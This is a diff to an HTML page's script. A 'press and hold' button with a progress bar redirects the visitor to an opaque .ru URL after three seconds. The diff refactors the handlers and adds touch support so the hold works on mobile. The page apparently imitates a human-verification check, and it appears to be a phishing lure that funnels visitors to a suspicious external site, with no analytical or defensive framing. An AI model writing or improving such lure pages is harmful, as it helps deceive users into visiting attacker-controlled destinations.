@@ -93,8 +93,8 @@
     const buttonText = document.getElementById('buttonText');
     let holdTimeout;
 
-    holdButton.addEventListener('mousedown', () => {
-      // Start progress animation from the left side to the right
+    // Function to start the progress animation and set the timeout
+    function startProgress() {
       progressBar.style.transition = 'width 3s linear';
       progressBar.style.width = '100%';
       
@@ -107,21 +107,23 @@
         // Redirect immediately
         window.location.href = 'https://ytyctyp.goldenlakes.ru/L3xl/';
       }, 3000); // Match the 3 seconds of progress animation
-    });
+    }
 
-    holdButton.addEventListener('mouseup', () => {
-      // Reset progress bar if the user releases the button early
+    // Function to reset progress when button is released
+    function resetProgress() {
       clearTimeout(holdTimeout);
       progressBar.style.transition = 'width 0.2s linear';
       progressBar.style.width = '0';
-    });
+    }
 
-    holdButton.addEventListener('mouseleave', () => {
-      // Reset progress bar if the mouse leaves the button early
-      clearTimeout(holdTimeout);
-      progressBar.style.transition = 'width 0.2s linear';
-      progressBar.style.width = '0';
-    });
+    // Add event listeners for both mouse and touch events
+    holdButton.addEventListener('mousedown', startProgress);
+    holdButton.addEventListener('mouseup', resetProgress);
+    holdButton.addEventListener('mouseleave', resetProgress);
+
+    holdButton.addEventListener('touchstart', startProgress);
+    holdButton.addEventListener('touchend', resetProgress);
+    holdButton.addEventListener('touchcancel', resetProgress); // In case touch is canceled
   </script>
 </body>
 </html>
